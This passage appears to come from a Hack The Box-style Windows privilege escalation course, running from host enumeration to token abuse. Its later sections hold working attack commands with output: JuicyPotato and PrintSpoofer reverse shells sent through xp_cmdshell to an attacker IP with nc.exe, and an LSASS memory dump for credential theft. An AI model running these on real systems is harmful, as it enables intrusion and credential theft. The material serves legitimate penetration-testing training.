  192.168.20.255        ff-ff-ff-ff-ff-ff     static
```

---

## Routing Table

The routing table shows how the machine routes traffic to different networks. This helps us understand network topology and find other reachable network segments. Multiple routes to different subnets indicate the host can reach multiple networks. Persistent routes are manually configured and stay after reboot which tells us about intentional network connectivity decisions made by administrators.

```cmd
C:\htb> route print

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       10.129.0.1      10.129.43.8     25
          0.0.0.0          0.0.0.0     192.168.20.1    192.168.20.56    271
       10.129.0.0      255.255.0.0         On-link       10.129.43.8    281
     192.168.20.0    255.255.255.0         On-link     192.168.20.56    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0     192.168.20.1  Default
```

---

## Enumerating Protections

Most modern environments have some sort of anti-virus or Endpoint Detection and Response (EDR) service running to monitor, alert on, and block threats proactively. These tools may interfere with our enumeration process and will very likely present some challenge during the privilege escalation process especially if we are using some kind of public PoC exploit or tool. Enumerating protections in place will help us ensure that we are using methods that are not being blocked or detected and will help us if we have to craft custom payloads or modify tools before compiling them. Many organizations also utilize application whitelisting solutions like AppLocker to control what types of applications and files certain users can run.

---

## Check Windows Defender Status

The Get-MpComputerStatus PowerShell cmdlet shows the current status of Windows Defender including whether real-time protection, antivirus, antispyware, and behavior monitoring are enabled. If RealTimeProtectionEnabled is True then Defender is actively scanning and will likely detect our tools. If all protections show as False or Disabled then our tools will likely run without issue. This is one of the first things to check because it determines whether we need to modify our tools or use different techniques.

```powershell
PS C:\htb> Get-MpComputerStatus

AMServiceEnabled                : True
AntispywareEnabled              : True
AntivirusEnabled                : True
BehaviorMonitorEnabled          : False
IoavProtectionEnabled           : False
NISEnabled                      : False
OnAccessProtectionEnabled       : False
RealTimeProtectionEnabled       : False
```

---

## List AppLocker Rules

AppLocker is Microsoft''s application whitelisting solution. This PowerShell command shows what rules are currently enforced. Each rule has an Action field that is either Allow or Deny and a UserOrGroupSid that specifies who it applies to. The SID S-1-1-0 means Everyone and S-1-5-32-544 means Administrators. If scripts or executables are only allowed from the Program Files or Windows directories you may need an AppLocker bypass either during enumeration or before running a tool to escalate privileges.

```powershell
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PathConditions      : {%PROGRAMFILES%\*}
Id                  : 921cc481-6e17-4653-8f75-050b80acca20
Name                : (Default Rule) All files located in the Program Files folder
Description         : Allows members of the Everyone group to run applications that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
Name                : (Default Rule) All files located in the Windows folder
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
Name                : (Default Rule) All files
Description         : Allows members of the local Administrators group to run all applications.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow
```

---

## Test AppLocker Policy

This command tests whether a specific executable is allowed or denied by AppLocker for a given user. If the PolicyDecision shows Denied then that binary is blocked by AppLocker for regular users. You can change the path to test other executables like powershell.exe or your custom tools. This helps you understand what you can and cannot run before wasting time on techniques that will be blocked.

```powershell
PS C:\htb> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

FilePath                    PolicyDecision MatchingRule
--------                    -------------- ------------
C:\Windows\System32\cmd.exe         Denied c:\windows\system32\cmd.exe
```

---

## Initial Enumeration

During an assessment we may gain a low-privileged shell on a Windows host and need to perform privilege escalation to further our access. Fully compromising the host may gain us access to sensitive files or file shares, grant us the ability to capture traffic to obtain more credentials, or obtain credentials that can help further our access or even escalate directly to Domain Admin in an Active Directory environment. We can escalate privileges to the highly privileged NT AUTHORITY\SYSTEM account which has more privileges than a local administrator and is used to run most Windows services, the built-in local administrator account, another local account that is a member of the Administrators group, a standard domain user who is part of the local Administrators group, or a domain admin who is part of the local Administrators group. Enumeration is the key to privilege escalation and when we gain initial shell access it is vital to gain situational awareness and uncover details relating to the OS version, patch level, installed software, current privileges, group memberships, and more.

---

## Key Data Points

The three most critical starting points when enumerating a Windows system for privilege escalation are the OS name, the version, and running services. The OS name tells us the type of Windows whether workstation or server and the level such as Windows 7 or 10 or Server 2008, 2016, 2019 which gives us an idea of the types of tools available and whether public exploits exist. The version may have specific public exploits targeting a vulnerability in that specific version and Windows system exploits can cause system instability or even a complete crash so be careful running these against any production system. Running services are important especially those running as NT AUTHORITY\SYSTEM or an administrator-level account because a misconfigured or vulnerable service running in the context of a privileged account can be an easy win for privilege escalation.

---

## System Information — Tasklist

The tasklist command with the /svc flag shows all running processes and which services are associated with them. This helps us identify non-standard applications that may be vulnerable or misconfigured. Standard Windows processes such as smss.exe, csrss.exe, winlogon.exe, lsass.exe, and svchost.exe should be familiar to us so we can quickly spot non-standard processes. In the example below the FileZilla FTP server running is most interesting and we would attempt to enumerate the version to look for public vulnerabilities or misconfigurations such as FTP anonymous access. Other processes such as MsMpEng.exe which is Windows Defender are interesting because they help us map out what protections are in place on the target host.

```cmd
C:\htb> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
smss.exe                       316 N/A
csrss.exe                      424 N/A
winlogon.exe                   612 N/A
services.exe                   664 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 BrokerInfrastructure, DcomLaunch, LSM, PlugPlay, Power
svchost.exe                   1008 Dhcp, EventLog, lmhosts, TimeBrokerSvc
spoolsv.exe                   1884 Spooler
FileZilla Server.exe          1140 FileZilla Server
inetinfo.exe                  1164 IISADMIN
MsMpEng.exe                   2136 WinDefend
```

---

## Display All Environment Variables

The environment variables explain a lot about the host configuration. The set command prints all of them. One of the most overlooked variables is PATH. If a custom path is placed before C:\Windows\System32 it is much more dangerous because when running a program Windows looks for that program in the CWD first then from the PATH going left to right. If a writable custom directory appears early in the PATH it may be possible to perform DLL injection attacks against other applications. In addition to PATH the set command can reveal the HOME DRIVE which in enterprises is often a file share that may contain sensitive data. The USERPROFILE variable combined with AppData paths is important because files placed in USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup will execute when the user logs into a different machine with roaming profiles.

```cmd
C:\htb> set

ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\Administrator\AppData\Roaming
COMPUTERNAME=WINLPE-SRV01
HOMEDRIVE=C:
HOMEPATH=\Users\Administrator
OS=Windows_NT
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
PROCESSOR_ARCHITECTURE=AMD64
USERNAME=Administrator
USERPROFILE=C:\Users\Administrator
```

---

## View Detailed Configuration Information — systeminfo

The systeminfo command shows if the box has been patched recently and if it is a VM. If the box has not been patched recently getting administrator-level access may be as simple as running a known exploit. Google the KBs installed under HotFixes to get an idea of when the box has been patched. This information is not always present as it is possible to hide hotfixes from non-administrators. The System Boot Time and OS Version can also be checked to get an idea of the patch level. If the box has not been restarted in over six months chances are it is also not being patched. Additionally the Network Card section shows if the host is dual-homed which is important for lateral movement planning.

```cmd
C:\htb> systeminfo

Host Name:                 WINLPE-SRV01
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Configuration:          Standalone Server
System Manufacturer:       VMware, Inc.
System Type:               x64-based PC
Processor(s):              3 Processor(s) Installed.
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB5001078
                           [03]: KB4103723
Network Card(s):           2 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 IP address(es)
                                 [01]: 10.129.43.8
                           [02]: vmxnet3 Ethernet Adapter
                                 IP address(es)
                                 [01]: 192.168.20.56
```

---

## Patches and Updates

If systeminfo does not display hotfixes they may be queryable with WMI using the WMI-Command binary with QFE (Quick Fix Engineering) to display patches. We can also do this with PowerShell using the Get-Hotfix cmdlet. Knowing the exact patch level helps us find which exploits will work. A quick Google search of the last installed hotfix will tell us when the system was last patched. If the most recent patch is months or years old the system is likely vulnerable to many known kernel exploits.

```cmd
C:\htb> wmic qfe

Caption                                     CSName        Description      HotFixID   InstalledOn
http://support.microsoft.com/?kbid=3199986  WINLPE-SRV01  Update           KB3199986  11/21/2016
https://support.microsoft.com/help/5001078  WINLPE-SRV01  Security Update  KB5001078  3/25/2021
http://support.microsoft.com/?kbid=4103723  WINLPE-SRV01  Security Update  KB4103723  3/25/2021
```

```powershell
PS C:\htb> Get-HotFix | ft -AutoSize

Source       Description     HotFixID  InstalledBy                InstalledOn
------       -----------     --------  -----------                -----------
WINLPE-SRV01 Update          KB3199986 NT AUTHORITY\SYSTEM        11/21/2016 12:00:00 AM
WINLPE-SRV01 Security Update KB5001078 NT AUTHORITY\SYSTEM        3/25/2021 12:00:00 AM
WINLPE-SRV01 Security Update KB4103723 WINLPE-SRV01\Administrator 3/25/2021 12:00:00 AM
```

---

## Installed Programs

WMI can also be used to display installed software. This information can often guide us towards hard-to-find exploits. If FileZilla, PuTTY, or similar applications are installed we should run LaZagne to check if stored credentials exist for those applications. Some programs may be installed and running as a service that is vulnerable. We can also do this with PowerShell using the Get-WmiObject cmdlet which gives both the Name and Version number.

```cmd
C:\htb> wmic product get name

Name
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127
Java 8 Update 231 (64-bit)
VMware Tools
```

```powershell
PS C:\htb> Get-WmiObject -Class Win32_Product | select Name, Version

Name                                                                    Version
----                                                                    -------
SQL Server 2016 Database Engine Shared                                  13.2.5026.0
Microsoft OLE DB Driver for SQL Server                                  18.3.0.0
Java 8 Update 231 (64-bit)                                              8.0.2310.11
```

---

## Display Running Processes — Netstat

The netstat command displays active TCP and UDP connections which gives us a better idea of what services are listening on which ports both locally and accessible to the outside. We may find a vulnerable service only accessible to the localhost when logged on to the host that we can exploit to escalate privileges. The main thing to look for are entries listening on loopback addresses 127.0.0.1 and ::1 that are not listening on the external IP address or broadcast. Localhost network sockets are often insecure due to the thought that they are not accessible to the network. For example FileZilla''s administrative interface on port 14147 listening only on localhost could be connected to for extracting FTP passwords or creating an FTP share at C:\ as the FileZilla Server user which is potentially Administrator.

```powershell
PS C:\htb> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1096
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       840
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3520
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       968
  TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING       3812
```

---

## User and Group Information

Users are often the weakest link in an organization especially when systems are configured and patched well. It is essential to gain an understanding of the users and groups on the system, members of specific groups that can provide us with admin level access, the privileges our current user has, password policy information, and any logged on users that we may be able to target. We may find the system to be well patched but a member of the local administrators group''s user directory is browsable and contains a password file such as logins.xlsx resulting in a very easy win. It is always important to determine what users are logged into a system and whether they are idle or active because during an evasive engagement we would need to tread lightly on a host with other users actively working on it to avoid detection.

```cmd
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#2           1  Active          .  3/25/2021 9:27 AM
```

---

## Current User Context

When we gain access to a host we should always check what user context our account is running under first. Sometimes we are already SYSTEM or equivalent. If we gain access as a service account we may have privileges such as SeImpersonatePrivilege which can often be easily abused to escalate privileges using a tool such as Juicy Potato.

```cmd
C:\htb> echo %USERNAME%
htb-student

C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

---

## Current User Group Information

Checking group membership tells us if our user has inherited any rights through their group membership. They might be privileged in the Active Directory domain environment which could be leveraged to gain access to more systems.

```cmd
C:\htb> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==========================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default
```

---

## Get All Users and Groups

Knowing what other users are on the system is important. If we gained RDP access using credentials captured for a user bob and see a bob_adm user in the local administrators group it is worth checking for credential reuse. We may find valuable files such as scripts with passwords or SSH keys in a user''s Desktop, Documents, or Downloads folder. Knowing what non-standard groups are present on the host can help us determine what the host is used for and may even lead to discovering a misconfiguration such as all Domain Users in the Remote Desktop or local administrators groups.

```cmd
C:\htb> net user

User accounts for \\WINLPE-SRV01
-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
helpdesk                 htb-student              jordan
sarah                    secsvc
The command completed successfully.

C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
helpdesk
sarah
secsvc
The command completed successfully.
```

---

## Get Password Policy and Other Account Information

The password policy tells us about lockout thresholds and password requirements which is useful for password spraying and brute force planning. A lockout threshold of Never means we can try unlimited passwords without locking accounts. Minimum password length of 0 means blank passwords are possible. No password history means users can reuse old passwords. This is a very weak password policy and presents significant opportunities for credential attacks.

```cmd
C:\htb> net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.
```

---

# Part 3: Communication with Processes, Windows Privileges Overview, SeImpersonate, SeDebugPrivilege & SeTakeOwnership

---

## Communication with Processes

One of the best places to look for privilege escalation is the processes that are running on the system. Even if a process is not running as an administrator it may lead to additional privileges. The most common example is discovering a web server like IIS or XAMPP running on the box, placing an aspx or php shell on the box, and gaining a shell as the user running the web server. Generally this is not an administrator but will often have the SeImpersonate token allowing for Rogue, Juicy, or Lonely Potato attacks to provide SYSTEM permissions.

---

## Access Tokens

In Windows access tokens are used to describe the security context of a process or thread. The token includes information about the user account''s identity and privileges related to a specific process or thread. When a user authenticates to a system their password is verified against a security database and if properly authenticated they will be assigned an access token. Every time a user interacts with a process a copy of this token will be presented to determine their privilege level. These tokens are not considered secure resources as they are just locations within memory. To utilize another process''s token the SeImpersonate privilege is needed which is only given to administrative accounts and in most cases can be removed during system hardening.

---

## Enumerating Network Services

The most common way people interact with processes is through a network socket such as DNS, HTTP, or SMB. The netstat command will display active TCP and UDP connections. The main thing to look for with active network connections are entries listening on loopback addresses 127.0.0.1 and ::1 that are not listening on the IP address or broadcast. The reason is that network sockets on localhost are often insecure due to the thought that they are not accessible to the network. For example port 14147 is used for FileZilla''s administrative interface and by connecting to this port it may be possible to extract FTP passwords in addition to creating an FTP share at C:\ as the FileZilla Server user which is potentially Administrator.

```cmd
C:\htb> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       3812
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       836
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       936
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       5044
  TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING       3812
```

Other commonly overlooked but important local privilege escalation vectors include the Splunk Universal Forwarder which installs on endpoints to send logs into Splunk and whose default configuration had no authentication allowing anyone to deploy applications leading to code execution as SYSTEM, and the Erlang Port on 25672 where applications like RabbitMQ use a weak default cookie that can be exploited to join the cluster and execute code.

---

## Named Pipes

Named pipes are another way processes communicate with each other. They are essentially files stored in memory that get cleared out after being read. Pipes are used for communication between two applications or processes using shared memory. There are two types — named pipes and anonymous pipes. Named pipes can communicate using half-duplex which is a one-way channel with the client only being able to write data to the server, or duplex which is a two-way communication channel. A named pipe may have multiple simultaneous instances with each client connection creating a new instance that shares the same pipe name but uses its own independent data buffer.

We can use the tool PipeList from the Sysinternals Suite to enumerate instances of named pipes. Additionally we can use PowerShell to list named pipes using gci which is an alias for Get-ChildItem.

```cmd
C:\htb> pipelist.exe /accepteula

Pipe Name                                    Instances       Max Instances
---------                                    ---------       -------------
InitShutdown                                      3               -1
lsass                                             4               -1
ntsvcs                                            3               -1
scerpc                                            3               -1
epmapper                                          3               -1
spoolss                                           3               -1
wkssvc                                            4               -1
srvsvc                                            4               -1
vmware-authdpipe                                  1                1
```

```powershell
PS C:\htb> gci \\.\pipe\

    Directory: \\.\pipe

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 InitShutdown
------       12/31/1600   4:00 PM              4 lsass
------       12/31/1600   4:00 PM              3 ntsvcs
------       12/31/1600   4:00 PM              3 scerpc
------       12/31/1600   4:00 PM              3 epmapper
```

---

## Reviewing Named Pipe Permissions

After obtaining a listing of named pipes we can use Accesschk from Sysinternals to enumerate the permissions assigned to a specific named pipe by reviewing the Discretionary Access List (DACL) which shows us who has the permissions to modify, write, read, or execute a resource. Only administrators should have full access to sensitive pipes like lsass. Any pipe where Everyone or BUILTIN\Users has write permissions is a potential escalation vector.

```cmd
C:\htb> accesschk.exe /accepteula \\.\Pipe\lsass -v

\\.\Pipe\lsass
  Untrusted Mandatory Level [No-Write-Up]
  RW Everyone
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        SYNCHRONIZE
        READ_CONTROL
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
```

---

## Named Pipes Attack Example — WindscribeService

The WindscribeService Named Pipe Privilege Escalation is a great example. Using accesschk we can search for all named pipes that allow write access with accesschk.exe -w \pipe\* -v and notice that the WindscribeService named pipe allows READ and WRITE access to the Everyone group meaning all authenticated users. Confirming with accesschk we see that the Everyone group does indeed have FILE_ALL_ACCESS over the pipe which means any authenticated user can potentially leverage these lax permissions to escalate privileges on the host to SYSTEM.

```cmd
C:\htb> accesschk.exe -accepteula -w \pipe\WindscribeService -v

\\.\Pipe\WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
```

---

## Windows Privileges Overview

Privileges in Windows are rights that an account can be granted to perform a variety of operations on the local system such as managing services, loading drivers, shutting down the system, debugging an application, and more. Privileges are different from access rights which a system uses to grant or deny access to securable objects. User and group privileges are stored in a database and granted via an access token when a user logs on to a system. An account can have local privileges on a specific computer and different privileges on different systems if the account belongs to an Active Directory domain. Each time a user attempts to perform a privileged action the system reviews the user''s access token to see if the account has the required privileges and if so checks to see if they are enabled. Most privileges are disabled by default and some can be enabled by opening an administrative cmd.exe or PowerShell console while others can be enabled manually.

---

## Windows Authorization Process

Security principals are anything that can be authenticated by the Windows operating system including user and computer accounts, processes that run in the security context of another account, or the security groups that these accounts belong to. Every single security principal is identified by a unique Security Identifier (SID). When a security principal is created it is assigned a SID which remains assigned for its lifetime. The authorization process works by comparing the user''s access token which contains their user SID, group SIDs, privilege list, and other access information against Access Control Entries (ACEs) within the object''s security descriptor which contains access rights granted to users or groups. Once this comparison is complete a decision is made to either grant or deny access. This entire process happens almost instantaneously whenever a user tries to access a resource.

---

## Rights and Privileges in Windows — Key Groups

Windows contains many groups that grant their members powerful rights and privileges. Many of these can be abused to escalate privileges on both a standalone Windows host and within an Active Directory domain environment.

| Group | Description |
|-------|-------------|
| **Default Administrators** | Domain Admins and Enterprise Admins are super groups |
| **Server Operators** | Members can modify services, access SMB shares, and backup files |
| **Backup Operators** | Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database |
| **Print Operators** | Members can log on to DCs locally and trick Windows into loading a malicious driver |
| **Hyper-V Administrators** | If there are virtual DCs any virtualization admins should be considered Domain Admins |
| **Account Operators** | Members can modify non-protected accounts and groups in the domain |
| **Remote Desktop Users** | Often granted additional rights such as Allow Login Through Remote Desktop Services |
| **Remote Management Users** | Members can log on to DCs with PSRemoting |
| **Group Policy Creator Owners** | Members can create new GPOs but would need additional permissions to link them |
| **Schema Admins** | Members can modify the Active Directory schema structure |
| **DNS Admins** | Members can load a DLL on a DC but do not have the necessary permissions to restart the DNS server |

---

## User Rights Assignment — Key Privileges

These are the key user rights assignments that are most commonly abused for privilege escalation. Typing the command whoami /priv will give a listing of all user rights assigned to the current user. Some rights are only available to administrative users and can only be listed or leveraged when running an elevated cmd or PowerShell session. When a privilege is listed in the Disabled state it means our account has the specific privilege assigned but it cannot be used in an access token until it is enabled. Windows does not provide a built-in command to enable privileges so we need some scripting.

| Privilege | Description |
|-----------|-------------|
| **SeBackupPrivilege** | Bypass file and directory permissions for backing up the system |
| **SeDebugPrivilege** | Attach to or open any process even ones not owned. Access to sensitive OS components |
| **SeImpersonatePrivilege** | Impersonate a user or another specified account and act on behalf of the user |
| **SeLoadDriverPrivilege** | Dynamically load and unload device drivers which run as highly privileged code |
| **SeRestorePrivilege** | Bypass file permissions when restoring backed up files and directories |
| **SeTakeOwnershipPrivilege** | Take ownership of any securable object including files, folders, registry keys, services and processes |
| **SeTcbPrivilege** | Assume the identity of any user and obtain access to resources that user is permitted to access |

---

## Local Admin User Rights — Elevated vs Standard

A local administrator in an elevated command window has many powerful privileges including SeDebugPrivilege, SeImpersonatePrivilege, SeBackupPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, and many more. Most appear as Disabled but can be enabled when needed. A standard user in contrast has only SeChangeNotifyPrivilege and SeIncreaseWorkingSetPrivilege. This massive difference is why escalating from standard user to admin is so impactful.

```powershell
PS C:\htb> whoami
winlpe-srv01\administrator

PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
```

Standard user comparison:

```powershell
PS C:\htb> whoami
winlpe-srv01\htb-student

PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

---

## SeImpersonate and SeAssignPrimaryToken

In Windows every process has a token that has information about the account that is running it. These tokens are not considered secure resources as they are just locations within memory that could be brute-forced by users. To utilize the token the SeImpersonate privilege is needed which is only given to administrative accounts and in most cases can be removed during system hardening. Legitimate programs may utilize another process''s token to escalate from Administrator to Local System. Attackers often abuse this privilege in the Potato style privilege escalations where a service account can SeImpersonate but not obtain full SYSTEM level privileges. Essentially the Potato attack tricks a process running as SYSTEM to connect to the attacker''s process which hands over the token to be used.

We will often run into this privilege after gaining remote code execution via an application that runs in the context of a service account such as uploading a web shell to an ASP.NET web application, achieving remote code execution through a Jenkins installation, or by executing commands through MSSQL queries. Whenever we gain access in this way we should immediately check for this privilege as its presence often offers a quick and easy route to elevated privileges.

---

## SeImpersonate Example — JuicyPotato

In this scenario the SQL Service service account is running in the context of the default mssqlserver account. We have achieved command execution using xp_cmdshell using credentials found on a file share. First we connect to the SQL server instance using mssqlclient.py from Impacket, enable xp_cmdshell, and confirm we are running as the SQL service account with SeImpersonatePrivilege enabled.

```bash
$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth

Password:
[*] Encryption required, switching to TLS
SQL>
```

```
SQL> enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option ''xp_cmdshell'' changed from 0 to 1.

SQL> xp_cmdshell whoami

output
--------------------------------------------------------------------------------
nt service\mssql$sqlexpress01

SQL> xp_cmdshell whoami /priv

output
--------------------------------------------------------------------------------
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

The command whoami /priv confirms that SeImpersonatePrivilege is listed and Enabled. This privilege can be used to impersonate a privileged account such as NT AUTHORITY\SYSTEM. JuicyPotato can be used to exploit the SeImpersonate or SeAssignPrimaryToken privileges via DCOM/NTLM reflection abuse. To escalate privileges we first download the JuicyPotato.exe binary and upload this and nc.exe to the target server, stand up a Netcat listener on our attack machine, and execute the command where -l is the COM server listening port, -p is the program to launch, -a is the argument passed to cmd.exe, and -t * tells the tool to try both CreateProcessWithTokenW and CreateProcessAsUser functions.

```
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

output
--------------------------------------------------------------------------------
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375

[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
[+] calling 0x000000000088ce08
```

This completes successfully and a shell as NT AUTHORITY\SYSTEM is received on our Netcat listener.

```bash
$ sudo nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
WINLPE-SRV01
```

---

## PrintSpoofer and RoguePotato

JuicyPotato does not work on Windows Server 2019 and Windows 10 build 1809 onwards. However PrintSpoofer and RoguePotato can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM level access on these newer systems. PrintSpoofer abuses impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works. We can use the tool to spawn a SYSTEM process in the current console and interact with it, spawn a SYSTEM process on a desktop if logged on locally or via RDP, or catch a reverse shell. Connect with mssqlclient.py and use the tool with the -c argument to execute a command.

```
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

output
--------------------------------------------------------------------------------
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
NULL
```

If all goes according to plan we will have a SYSTEM shell on our netcat listener.

```bash
$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847

C:\Windows\system32>whoami
nt authority\system
```

Escalating privileges by leveraging SeImpersonate is very common. It is essential to be familiar with the various methods available depending on the target host OS version and level. The decision tree is simple — if the target is Windows Server 2016 or Windows 10 build below 1809 use JuicyPotato, if the target is Windows Server 2019 or Windows 10 build 1809 and above use PrintSpoofer or RoguePotato.

---

## SeDebugPrivilege

To run a particular application or service or assist with troubleshooting a user might be assigned the SeDebugPrivilege instead of adding the account into the administrators group. This privilege can be assigned via local or domain group policy under Computer Settings > Windows Settings > Security Settings. By default only administrators are granted this privilege as it can be used to capture sensitive information from system memory or access and modify kernel and application structures. This right may be assigned to developers who need to debug new system components as part of their day-to-day job. This user right should be given out sparingly because any account that is assigned it will have access to critical operating system components.

During an internal penetration test it is often helpful to use websites such as LinkedIn to gather information about potential users to target. If we are retrieving many NTLMv2 password hashes using Responder or Inveigh we may want to focus our password hash cracking efforts on possible high-value accounts such as developers who are more likely to have these types of privileges assigned to their accounts. A user may not be a local admin on a host but have rights that we cannot enumerate remotely using a tool such as BloodHound.

---

## Dumping LSASS with ProcDump

We can use ProcDump from the SysInternals suite to leverage SeDebugPrivilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service (LSASS) process which stores user credentials after a user logs on to a system. The -accepteula flag accepts the Sysinternals license agreement, -ma creates a full memory dump, and lsass.exe is the target process. The output file can then be loaded into Mimikatz for credential extraction.

```cmd
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled

C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.
```

---

## Extracting Credentials with Mimikatz

